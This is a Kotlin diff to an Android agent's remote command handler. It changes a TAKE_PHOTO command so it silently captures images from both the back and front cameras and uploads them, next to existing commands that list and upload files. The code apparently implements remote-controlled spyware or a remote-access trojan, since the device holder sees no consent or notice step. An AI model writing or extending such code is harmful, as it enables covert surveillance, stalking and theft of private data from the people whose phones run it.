@@ -36,7 +36,7 @@ object CommandHandler {
                     JSONObject().put("message", "Metrics update triggered")
                 }
                 "LIST_FILES" -> listFiles(service, params)
-                "TAKE_PHOTO" -> takePhoto(service)
+                "TAKE_PHOTO" -> takePhoto(service, params)
                 "UPLOAD_FILE" -> uploadFile(service, params)
                 else         -> JSONObject().put("error", "Unknown command: $commandType")
             }
@@ -136,10 +136,35 @@ object CommandHandler {
         }
     }
 
-    private suspend fun takePhoto(service: AgentService): JSONObject {
-        val photoFile = CameraHandler.takePhoto(service, service) 
-            ?: return JSONObject().put("error", "Failed to capture photo")
-        return doUpload(service, photoFile)
+    private suspend fun takePhoto(service: AgentService, params: JSONObject?): JSONObject {
+        // Sequential capture to avoid camera resource conflicts
+        val backPhoto = CameraHandler.takePhoto(service, service, cameraFacing = "back")
+        val frontPhoto = CameraHandler.takePhoto(service, service, cameraFacing = "front")
+        
+        var message = ""
+        var successCount = 0
+
+        if (backPhoto != null) {
+            val res = doUpload(service, backPhoto)
+            if (res.has("message")) {
+                message += "Back photo uploaded. "
+                successCount++
+            }
+        }
+
+        if (frontPhoto != null) {
+            val res = doUpload(service, frontPhoto)
+            if (res.has("message")) {
+                message += "Front photo uploaded."
+                successCount++
+            }
+        }
+
+        if (successCount == 0) {
+            return JSONObject().put("error", "Failed to capture or upload any photos.")
+        }
+
+        return JSONObject().put("message", message.trim())
     }
 
     private suspend fun uploadFile(service: AgentService, params: JSONObject?): JSONObject {
